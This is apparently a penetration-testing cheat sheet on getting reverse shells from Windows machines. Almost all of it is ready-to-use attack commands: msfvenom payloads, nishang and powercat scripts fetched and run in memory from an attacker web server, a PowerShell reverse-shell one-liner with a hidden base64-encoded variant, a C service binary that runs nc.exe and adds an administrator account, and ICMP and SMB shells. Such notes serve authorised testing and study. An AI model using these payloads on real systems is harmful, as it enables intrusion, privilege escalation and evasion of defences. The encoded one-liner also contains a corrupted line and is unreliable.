# Windows Rev Shells

### TCP (.exe,.ps1)

{% tabs %}
{% tab title="msfvenom" %}
Creation of .exe and .dll payloads:

```bash
# .exe:
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe # 32 bits.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > shell.exe # 64 bits.
.\shell.exe # Execute
# .dll:
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > shell.dll # 32 bits.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > shell.dll # 64 bits
rundll32 shell32.dll,Control_RunDLL <PATH>\shell.dll # Execute
```
{% endtab %}

{% tab title="nc" %}
```bash
rlwrap nc -nvlp <PORT> # rlwrap to have more management in the console.
rlwrap nc -u -nvlp <PORT> # UDP
```
{% endtab %}

{% tab title="PowerShell" %}
## #1. nishang

Nishang is a framework and a collection of scripts and payloads that enables the use of PowerShell for offensive security, penetration testing and network teaming. For this case, nishang has several scripts in PS that can help us get a reverse shell. One of those is the `Invoke-PowerShellTcp.ps1` script:

```bash
# You can clone the entire repository or directly download it:
cd /opt && git clone https://github.com/samratashok/nishang # /opt/nishang/Shells/Invoke-PowerShellTcp.ps1
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

Now you can upload it to the Windows computer, then import it and run the reverse shell:

```powershell
Import-Module .\Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

We can also avoid importing the module. To achieve this, we must execute it directly in memory, but the first thing we have to do is to modify the script and add the command at the end:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

Then we open a web server and run it in memory with the following command:

```bash
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')
```

### # 2. powercat

Netcat: The powershell version. (Powershell Version 2 and Later Supported)

```bash
# Attacker machine:
git clone https://github.com/besimorhino/powercat
cd powercat
## Open a web server.

# Compromised machine:
IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd
```

### #3. Oneliner

```powershell
# Normal:
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
# Encoded (base64):
echo -n "\$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback;5C2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};" > rev.txt
iconv -f ASCII -t UTF-16LE rev.txt | base64 -w 0
powershell -w hidden -exec bypass -nop -enc <BASE64> # Only the -enc parameter is sufficient.
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Tricks

{% content-ref url="../../misc/tricks/process-migration.md" %}
[process-migration.md](../../misc/tricks/process-migration.md)
{% endcontent-ref %}
{% endtab %}

{% tab title="C" %}
We will need a C script:

```bash
# Repo: https://github.com/sagishahar/scripts
wget https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c
```

We open the file `windows_service.c` and insert the code we want in the `system()` function:

```shell
cmd /c C:\Windows\Temp\nc.exe -e cmd <LHOST> <LPORT>
cmd.exe /k net localgroup administrators user /add
```

![](../../.gitbook/assets/windows\_service\_c.png)

Finally, we cross-compile the C code:

{% content-ref url="../exploits/compiling-exploits.md" %}
[compiling-exploits.md](../exploits/compiling-exploits.md)
{% endcontent-ref %}
{% endtab %}
{% endtabs %}

### ICMP/UDP/SMB

{% tabs %}
{% tab title="ICMP" %}
In some cases, the Windows firewall will block some TCP connections which will prevent us from obtaining a reverse shell. However, we can employ the use of the network protocol, ICMP, to obtain a reverse shell.

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1
```

We edit the Invoke-PowerShellIcmp.ps1, to add the following at the end:

```powershell
Invoke-PowerShellIcmp -IPAdress <LHOST>
```

Also, it is recommended to remove all comments from the script, including empty lines:

```bash
# Remove comments with any editor.
sed -i '/^\s*$/d' Invoke-PowerShellIcmp.ps1 # Remove empty lines.
```

Now, we download and run a script to receive the reverse shell over ICMP:

```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1 # Apply a rule for ICMP.
wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py # Script to receive the reverse shell over ICMP.
python3 icmpsh_m.py <LHOST> <TARGET_IP>
```

And finally, we run the PowerShell script in memory (remember to open a web server to be able to download it):

```bash
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellIcmp.ps1')
```
{% endtab %}

{% tab title="UDP" %}
### nishang

Nishang is a framework and a collection of scripts and payloads that enables the use of PowerShell for offensive security, penetration testing and network teaming. For this case, nishang has several scripts in PS that can help us get a reverse shell. One of those is the `Invoke-PowerShellUdp.ps1` script:

```powershell
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellUdp.ps1
```

Now you can upload it to the Windows computer, then import it and run the reverse shell:

```powershell
Import-Module .\Invoke-PowerShellUdp.ps1
Invoke-PowerShellUdp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

We can also avoid importing the module. To achieve this, we must execute it directly in memory, but the first thing we have to do is to modify the script and add the command at the end:

```powershell
Invoke-PowerShellUdp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

Then we open a web server and run it in memory with the following command:

```shell
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')
```
{% endtab %}

{% tab title="SMB" %}
### smbserver\#

Copy a binary of `nc.exe` and raise an SMB server with smbserver:

```bash
# Attacker machine (nc.exe):
smbserver.py smbFolder $(pwd)
smbserver.py smbFolder $(pwd) -smb2support # For Windows 10 support.
# Victim machine:
start /b \\<IP>\smbFolder\nc.exe -e cmd <LHOST> 4444
```
{% endtab %}
{% endtabs %}
